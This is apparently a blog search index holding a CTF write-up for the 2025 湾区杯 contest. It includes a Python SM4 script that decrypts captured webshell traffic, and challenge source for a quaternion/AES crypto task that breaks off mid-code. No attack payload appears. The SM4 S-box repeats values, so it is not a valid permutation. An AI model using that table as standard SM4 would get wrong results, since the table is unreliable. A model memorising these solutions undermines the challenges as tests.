<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2025湾区杯</title>
    <link href="/2025/09/09/ctf/wp/2025/%E6%B9%BE%E5%8C%BA%E6%9D%AF/"/>
    <url>/2025/09/09/ctf/wp/2025/%E6%B9%BE%E5%8C%BA%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="checkwebshell"><a href="#checkwebshell" class="headerlink" title="checkwebshell"></a>checkwebshell</h2><p>追踪shell.php翻找流能看到马<br>解密一下出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SM4</span>:<br>    ENCRYPT = <span class="hljs-number">1</span><br>    DECRYPT = <span class="hljs-number">0</span><br>    FK = [<span class="hljs-number">0xA3B1BAC6</span>, <span class="hljs-number">0x56AA3350</span>, <span class="hljs-number">0x677D9197</span>, <span class="hljs-number">0xB27022DC</span>]<br>    CK = [<br>        <span class="hljs-number">0x00070E15</span>, <span class="hljs-number">0x1C232A31</span>, <span class="hljs-number">0x383F464D</span>, <span class="hljs-number">0x545B6269</span>,<br>        <span class="hljs-number">0x70777E85</span>, <span class="hljs-number">0x8C939AA1</span>, <span class="hljs-number">0xA8AFB6BD</span>, <span class="hljs-number">0xC4CBD2D9</span>,<br>        <span class="hljs-number">0xE0E7EEF5</span>, <span class="hljs-number">0xFC030A11</span>, <span class="hljs-number">0x181F262D</span>, <span class="hljs-number">0x343B4249</span>,<br>        <span class="hljs-number">0x50575E65</span>, <span class="hljs-number">0x6C737A81</span>, <span class="hljs-number">0x888F969D</span>, <span class="hljs-number">0xA4ABB2B9</span>,<br>        <span class="hljs-number">0xC0C7CED5</span>, <span class="hljs-number">0xDCE3EAF1</span>, <span class="hljs-number">0xF8FF060D</span>, <span class="hljs-number">0x141B2229</span>,<br>        <span class="hljs-number">0x30373E45</span>, <span class="hljs-number">0x4C535A61</span>, <span class="hljs-number">0x686F767D</span>, <span class="hljs-number">0x848B9299</span>,<br>        <span class="hljs-number">0xA0A7AEB5</span>, <span class="hljs-number">0xBCC3CAD1</span>, <span class="hljs-number">0xD8DFE6ED</span>, <span class="hljs-number">0xF4FB0209</span>,<br>        <span class="hljs-number">0x10171E25</span>, <span class="hljs-number">0x2C333A41</span>, <span class="hljs-number">0x484F565D</span>, <span class="hljs-number">0x646B7279</span><br>    ]<br>    SboxTable = [<br>        <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x05</span>,<br>        <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x99</span>,<br>        <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>,<br>        <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xA6</span>,<br>        <span class="hljs-number">0x47</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xA8</span>,<br>        <span class="hljs-number">0x68</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x35</span>,<br>        <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xEC</span>,<br>        <span class="hljs-number">0x84</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x27</span>,<br>        <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x0C</span>,<br>        <span class="hljs-number">0x76</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDD</span>,<br>        <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xB7</span>,<br>        <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x40</span>,<br>        <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x08</span>,<br>        <span class="hljs-number">0x46</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xEA</span>,<br>        <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8F</span>,<br>        <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x33</span><br>    ]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, key</span>):<br>        <span class="hljs-variable language_">self</span>.sk = [<span class="hljs-number">0</span>] * <span class="hljs-number">32</span><br>        <span class="hljs-variable language_">self</span>.set_key(key)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_key</span>(<span class="hljs-params">self, key</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) != <span class="hljs-number">16</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Key must be 16 bytes long&quot;</span>)<br>        key_bytes = key.encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(key, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">else</span> key<br>        k = <span class="hljs-variable language_">self</span>.str_to_int_array(key_bytes)<br>        <span class="hljs-comment"># 扩展k数组以容纳32轮密钥</span><br>        k = k + [<span class="hljs-number">0</span>] * <span class="hljs-number">32</span>  <span class="hljs-comment"># 现在k有36个元素</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            k[i] ^= <span class="hljs-variable language_">self</span>.FK[i]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>            k[i+<span class="hljs-number">4</span>] = k[i] ^ <span class="hljs-variable language_">self</span>.ckf(k[i+<span class="hljs-number">1</span>], k[i+<span class="hljs-number">2</span>], k[i+<span class="hljs-number">3</span>], <span class="hljs-variable language_">self</span>.CK[i])<br>            <span class="hljs-variable language_">self</span>.sk[i] = k[i+<span class="hljs-number">4</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">self, plaintext</span>):<br>        plaintext_bytes = plaintext.encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(plaintext, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">else</span> plaintext<br>        padding = <span class="hljs-number">16</span> - (<span class="hljs-built_in">len</span>(plaintext_bytes) % <span class="hljs-number">16</span>)<br>        plaintext_bytes += <span class="hljs-built_in">bytes</span>([padding] * padding)<br>        ciphertext = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(plaintext_bytes), <span class="hljs-number">16</span>):<br>            block = plaintext_bytes[i:i+<span class="hljs-number">16</span>]<br>            ciphertext += <span class="hljs-variable language_">self</span>.crypt_block(block, <span class="hljs-variable language_">self</span>.ENCRYPT)<br>        <span class="hljs-keyword">return</span> ciphertext<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self, ciphertext</span>):<br>        ciphertext_bytes = ciphertext <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(ciphertext, <span class="hljs-built_in">bytes</span>) <span class="hljs-keyword">else</span> base64.b64decode(ciphertext)<br>        plaintext = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ciphertext_bytes), <span class="hljs-number">16</span>):<br>            block = ciphertext_bytes[i:i+<span class="hljs-number">16</span>]<br>            plaintext += <span class="hljs-variable language_">self</span>.crypt_block(block, <span class="hljs-variable language_">self</span>.DECRYPT)<br>        padding = plaintext[-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> padding &lt; <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> padding &gt; <span class="hljs-number">16</span>:<br>            <span class="hljs-keyword">return</span> plaintext<br>        <span class="hljs-keyword">return</span> plaintext[:-padding]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">crypt_block</span>(<span class="hljs-params">self, block, mode</span>):<br>        x = <span class="hljs-variable language_">self</span>.str_to_int_array(block)<br>        <span class="hljs-keyword">if</span> mode == <span class="hljs-variable language_">self</span>.ENCRYPT:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>                round_key = <span class="hljs-variable language_">self</span>.sk[i]<br>                x.append(x[<span class="hljs-number">0</span>] ^ <span class="hljs-variable language_">self</span>.F(x[<span class="hljs-number">1</span>], x[<span class="hljs-number">2</span>], x[<span class="hljs-number">3</span>], round_key))<br>                x.pop(<span class="hljs-number">0</span>)<br>            x = x[::-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>                round_key = <span class="hljs-variable language_">self</span>.sk[i]<br>                x.append(x[<span class="hljs-number">0</span>] ^ <span class="hljs-variable language_">self</span>.F(x[<span class="hljs-number">1</span>], x[<span class="hljs-number">2</span>], x[<span class="hljs-number">3</span>], round_key))<br>                x.pop(<span class="hljs-number">0</span>)<br>            x = x[::-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.int_array_to_str(x)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">F</span>(<span class="hljs-params">self, x1, x2, x3, rk</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.T(x1 ^ x2 ^ x3 ^ rk)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ckf</span>(<span class="hljs-params">self, a, b, c, ck</span>):<br>        <span class="hljs-keyword">return</span> a ^ <span class="hljs-variable language_">self</span>.T(b ^ c ^ ck)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">T</span>(<span class="hljs-params">self, x</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.L(<span class="hljs-variable language_">self</span>.S(x))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">S</span>(<span class="hljs-params">self, x</span>):<br>        result = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            byte = (x &gt;&gt; (<span class="hljs-number">24</span> - i * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span><br>            result |= (<span class="hljs-variable language_">self</span>.SboxTable[byte] &lt;&lt; (<span class="hljs-number">24</span> - i * <span class="hljs-number">8</span>))<br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">L</span>(<span class="hljs-params">self, x</span>):<br>        <span class="hljs-keyword">return</span> x ^ <span class="hljs-variable language_">self</span>.rotl(x, <span class="hljs-number">2</span>) ^ <span class="hljs-variable language_">self</span>.rotl(x, <span class="hljs-number">10</span>) ^ <span class="hljs-variable language_">self</span>.rotl(x, <span class="hljs-number">18</span>) ^ <span class="hljs-variable language_">self</span>.rotl(x, <span class="hljs-number">24</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">rotl</span>(<span class="hljs-params">self, x, n</span>):<br>        <span class="hljs-keyword">return</span> ((x &lt;&lt; n) &amp; <span class="hljs-number">0xFFFFFFFF</span>) | ((x &gt;&gt; (<span class="hljs-number">32</span> - n)) &amp; <span class="hljs-number">0xFFFFFFFF</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">str_to_int_array</span>(<span class="hljs-params">self, s</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(s) != <span class="hljs-number">16</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Block must be 16 bytes&quot;</span>)<br>        arr = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            offset = i * <span class="hljs-number">4</span><br>            arr.append((s[offset] &lt;&lt; <span class="hljs-number">24</span>) | (s[offset+<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>) | (s[offset+<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) | s[offset+<span class="hljs-number">3</span>])<br>        <span class="hljs-keyword">return</span> arr<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">int_array_to_str</span>(<span class="hljs-params">self, arr</span>):<br>        s = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arr:<br>            s += <span class="hljs-built_in">bytes</span>([(i &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (i &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (i &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, i &amp; <span class="hljs-number">0xFF</span>])<br>        <span class="hljs-keyword">return</span> s<br><br><span class="hljs-comment"># 使用示例</span><br>key = <span class="hljs-string">&quot;a8a58b78f41eeb6a&quot;</span><br>ciphertext_base64 = <span class="hljs-string">&quot;VCWBIdzfjm45EmYFWcqXX0VpQeZPeI6Qqyjsv31yuPTDC80lhFlaJY2R3TintdQu&quot;</span><br><br>sm4 = SM4(key)<br>ciphertext_bytes = base64.b64decode(ciphertext_base64)<br>plaintext = sm4.decrypt(ciphertext_bytes)<br><span class="hljs-built_in">print</span>(plaintext.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>))<br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="new-trick"><a href="#new-trick" class="headerlink" title="new_trick"></a>new_trick</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag, secret<br><br>p = <span class="hljs-number">115792089237316195423570985008687907853269984665640564039457584007913129639747</span><br>Q_components = (<span class="hljs-number">123456789</span>, <span class="hljs-number">987654321</span>, <span class="hljs-number">135792468</span>, <span class="hljs-number">864297531</span>)<br>R_components = (<span class="hljs-number">53580504271939954579696282638160058429308301927753139543147605882574336327145</span>, <span class="hljs-number">79991318245209837622945719467562796951137605212294979976479199793453962090891</span>, <span class="hljs-number">53126869889181040587037210462276116096032594677560145306269148156034757160128</span>, <span class="hljs-number">97368024230306399859522783292246509699830254294649668434604971213496467857155</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Quaternion</span>:<br>    _slots_=(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b, c, d</span>):<br>        <span class="hljs-variable language_">self</span>.p = p<br>        <span class="hljs-variable language_">self</span>.a = a % <span class="hljs-variable language_">self</span>.p<br>        <span class="hljs-variable language_">self</span>.b = b % <span class="hljs-variable language_">self</span>.p<br>        <span class="hljs-variable language_">self</span>.c = c % <span class="hljs-variable language_">self</span>.p<br>        <span class="hljs-variable language_">self</span>.d = d % <span class="hljs-variable language_">self</span>.p<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span class="hljs-params">self, other</span>):<br>        a1, b1, c1, d1 = <span class="hljs-variable language_">self</span>.a, <span class="hljs-variable language_">self</span>.b, <span class="hljs-variable language_">self</span>.c, <span class="hljs-variable language_">self</span>.d<br>        a2, b2, c2, d2 = other.a, other.b, other.c, other.d<br>        a_new = a1 * a2 - b1 * b2 - c1 * c2 - d1 * d2<br>        b_new = a1 * b2 + b1 * a2 + c1 * d2 - d1 * c2<br>        c_new = a1 * c2 - b1 * d2 + c1 * a2 + d1 * b2<br>        d_new = a1 * d2 + b1 * c2 - c1 * b2 + d1 * a2<br>        <span class="hljs-keyword">return</span> Quaternion(a_new, b_new, c_new, d_new)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">conj</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> Quaternion(<span class="hljs-variable language_">self</span>.a, -<span class="hljs-variable language_">self</span>.b, -<span class="hljs-variable language_">self</span>.c, -<span class="hljs-variable language_">self</span>.d)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">norm</span>(<span class="hljs-params">self</span>):<br>        <span 